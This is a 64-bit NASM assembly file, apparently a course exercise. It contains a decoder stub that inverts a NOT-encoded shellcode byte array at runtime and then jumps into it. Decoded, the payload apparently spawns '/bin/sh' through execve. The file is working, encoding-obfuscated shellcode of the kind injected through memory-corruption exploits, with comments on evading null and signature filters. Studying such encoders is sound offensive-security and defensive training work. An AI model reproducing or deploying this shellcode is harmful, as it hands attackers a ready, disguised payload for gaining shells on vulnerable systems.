; File: decoder.nasm
; Author: Kevin Ren, originally professor Viviek
; Purpose: to demostrate a shellcode that decodes and passes control to NOT encoded shellcode
; editted for 64 bit mode, using rsi register instead of esi, and rcx, instead of ecx, also uses rip rel address method

global _start

section .text
_start:
	jmp short decoder			; bypass shellcode, does this so rel adddress can be Fs instead of 0s

	shellcode: db 0x14,0xe4,0xa0,0xb7,0xce,0x3f,0x77,0xb8,0xf8,0xb7,0x76,0x80,0xf7,0xb7,0x76,0xb8,0xef,0xb7,0x72,0x88,0xf7,0xb7,0x72,0xa8,0xef,0x4f,0xc4,0xf0,0xfa,0x17,0x1f,0x00,0x00,0x00,0xd0,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xbe,0xbd,0xbd,0xbd,0xbd,0xbd,0xbd,0xbd,0xbd,0xbc,0xbc,0xbc,0xbc,0xbc,0xbc,0xbc,0xbc 

decoder:
	lea rsi, [rel shellcode]		; address of shellcode is now obtained using rip relative address
	xor rcx, rcx				; zeroing out ecx so we can put counter for loop
	mov cl, 58

decode: 
	not byte [rsi]				; decode each byte of shellcode, storing result at the same location
	inc rsi					; increment esi to the next byte position for the next loop decode	
	loop decode				; loop ecx amount of times

	jmp short shellcode			; after all is decoded, pass control to decoded shellcode

